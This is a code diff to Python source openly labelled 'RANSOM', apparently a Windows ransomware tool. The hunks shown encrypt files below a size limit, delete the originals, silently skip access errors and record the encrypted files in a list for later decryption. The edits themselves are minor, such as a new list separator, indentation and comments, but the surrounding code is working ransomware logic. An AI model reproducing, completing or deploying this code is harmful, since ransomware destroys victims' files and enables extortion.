@@ -1,12 +1,12 @@
 ## RANSOM
 ## Main Script
 ## author mls
+## TODO Solve issue with decryption failing
 
 # Import libs
 import ctypes
 import os
 import sys
-import getopt
 import win32api
 import winerror
 import win32event
@@ -53,13 +53,16 @@ class Main(Base.Base):
     # Get list of encrypted files
     try:
       with open(self.encrypted_file_list) as fh:
-        file_list = fh.readlines()
+        file_list = fh.read()
       fh.close()
     except IOError:
       raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
 
     # Decrypt!
-    for encrypted_file in file_list:
+    for encrypted_file in file_list.split("<br>"):
+      if not encrypted_file:
+        continue
+
       print("Decrypting {}".format(encrypted_file.rstrip()))
 
       # IF successful decryption, delete locked file
@@ -80,7 +83,7 @@ class Main(Base.Base):
 
       # Encrypt file if less than specified file size
       if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
-         is_encrypted = self.Crypt.encrypt_file(file)
+        is_encrypted = self.Crypt.encrypt_file(file)
       else:
         is_encrypted = False
 
@@ -88,6 +91,7 @@ class Main(Base.Base):
       if is_encrypted:
         try:
           os.remove(file)
+        # Ignore any exception, such as access denied, and continue
         except:
           continue
         encrypted_files.append(file)
@@ -97,7 +101,7 @@ class Main(Base.Base):
       fh = open(self.encrypted_file_list, "w")
       for encrypted_file in encrypted_files:
         fh.write(encrypted_file)
-        fh.write("\n")
+        fh.write("<br>")
       fh.close()
 
 
@@ -118,12 +122,13 @@ class Main(Base.Base):
             if self.is_valid_filetype(file):
               file_list.append(os.path.join(path, file))
 
+
+
     return file_list
 
 
   def is_valid_filetype(self, file):
     # Function to validate that the file extension is valid
-    # TODO Add something (like mimetype) to check that the file is NOT wanted, if it has no extension
 
     # Split filename
     components = file.split(".")
